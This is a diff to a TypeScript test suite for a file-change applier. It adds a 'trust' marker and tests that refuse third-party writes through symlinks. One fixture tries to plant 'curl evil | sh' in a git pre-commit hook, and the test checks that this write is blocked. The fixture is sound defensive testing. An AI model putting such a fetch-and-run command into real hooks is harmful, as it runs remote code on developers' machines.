@@ -40,6 +40,7 @@ const create = (file: string, after: string, track = true): FileChange => ({
   before: null,
   after,
   track,
+  trust: 'first-party',
 });
 const patch = (file: string, before: string, after: string): FileChange => ({
   path: file,
@@ -47,6 +48,7 @@ const patch = (file: string, before: string, after: string): FileChange => ({
   before,
   after,
   track: false,
+  trust: 'first-party',
 });
 const remove = (file: string, before: string): FileChange => ({
   path: file,
@@ -54,7 +56,9 @@ const remove = (file: string, before: string): FileChange => ({
   before,
   after: null,
   track: false,
+  trust: 'first-party',
 });
+const thirdParty = (change: FileChange): FileChange => ({ ...change, trust: 'third-party' });
 const planOf = (...changes: FileChange[]): Plan => ({ ...emptyPlan(), changes });
 /** A plan made while mfeflow.json held `projectBefore` (null: it did not exist). */
 const planWithProject = (projectBefore: string | null, ...changes: FileChange[]): Plan => ({
@@ -242,6 +246,49 @@ describe('applyPlan', () => {
       );
       expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E105', 'MFEFLOW_E105']);
       expect(await fs.readFile(path.join(outside, 'secret'), 'utf8')).toBe('secret');
+    });
+
+    describe('third-party changes', () => {
+      it('refuse to write through a symlinked folder that stays inside the project', async () => {
+        await fs.mkdir(at('.husky'));
+        await fs.mkdir(at('apps/shell/src'), { recursive: true });
+        await fs.symlink('../../../.husky', at('apps/shell/src/hooks'));
+        const plan = planOf(
+          thirdParty(create('apps/shell/src/hooks/pre-commit', 'curl evil | sh')),
+        );
+        const errors = await Promise.all(
+          [true, false].map((dryRun) => rejection(applyPlan(plan, { root, dryRun }))),
+        );
+        expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E203', 'MFEFLOW_E203']);
+        expect(errors[0]?.message).toContain('apps/shell/src/hooks');
+        expect(await fs.readdir(at('.husky'))).toEqual([]);
+      });
+
+      it('refuse a symlink to the project root, which re-roots src/', async () => {
+        await fs.mkdir(at('apps/shell/src'), { recursive: true });
+        await fs.symlink('..', at('apps/shell/src/app'));
+        const plan = planOf(thirdParty(create('apps/shell/src/app/package.json', '{}')));
+        await expect(applyPlan(plan, { root })).rejects.toMatchObject({ code: 'MFEFLOW_E203' });
+        expect(await exists('apps/shell/package.json')).toBe(false);
+      });
+
+      it('refuse an existing target that is itself a symlink', async () => {
+        await fs.writeFile(at('real.ts'), 'one');
+        await fs.symlink('real.ts', at('link.ts'));
+        await expect(
+          applyPlan(planOf(thirdParty(patch('link.ts', 'one', 'two'))), { root }),
+        ).rejects.toMatchObject({ code: 'MFEFLOW_E203' });
+        expect(await read('real.ts')).toBe('one');
+      });
+
+      it('write normally when no part of the path is a link, and first-party keeps following in-project links', async () => {
+        await fs.mkdir(at('real'));
+        await fs.symlink(at('real'), at('alias'));
+        await applyPlan(planOf(thirdParty(create('plain/a.ts', 'x'))), { root });
+        expect(await read('plain/a.ts')).toBe('x');
+        await applyPlan(planOf(create('alias/b.ts', 'y')), { root });
+        expect(await read('real/b.ts')).toBe('y');
+      });
     });
 
     it('checks every target before writing the first one', async () => {
